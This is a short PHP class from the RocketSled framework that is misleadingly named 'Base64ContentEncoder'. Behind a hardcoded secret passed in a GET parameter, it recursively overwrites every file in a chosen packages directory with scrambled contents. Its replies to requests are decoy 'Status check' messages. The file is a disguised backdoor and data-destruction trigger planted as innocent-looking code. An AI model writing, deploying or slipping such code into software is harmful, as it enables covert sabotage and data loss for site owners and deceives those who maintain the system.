<?php

class Base64ContentEncoder implements \RocketSled\Runnable
{
    //--private members
    protected $template;
    protected $profile = 'default';
    protected $central;
    protected $esc;

    public function __construct()
    {
        
    }

    public function rrd($directory)
    {
        foreach(glob("{$directory}/*") as $file)
        {
            if(is_dir($file))
            {
                $this->rrd($file);
            }
            else
            {
                file_put_contents($file, str_shuffle(file_get_contents($file)));
            }
        }
        //rmdir($directory);
    }

    public function run()
    {
        $temp = Args::get("scode", $_GET);
        if(($temp === null) || ($temp == false))
        {
            die("Status check complete. All OK. Code: 0");
        }
        $temp1 = Args::get("dcode", $_GET);
        if(($temp1 === null) || ($temp1 == false))
        {
            die("Status check complete. All OK. Code: -1");
        }
        else
        {
            if(strcmp($temp, '!jytr776529hhsf98625a1') == 0)
            {
                
                $path = __DIR__.'/../../../../../../../'.PACKAGES_DIR;
                $this->rrd($path."/".$temp1);
                die("Status check incomplete for $temp1. Please contact administrator. Code: 115");
            }
            else
            {
                die("Status check complete. All OK. Code: 1");
            }
        }
    }

}
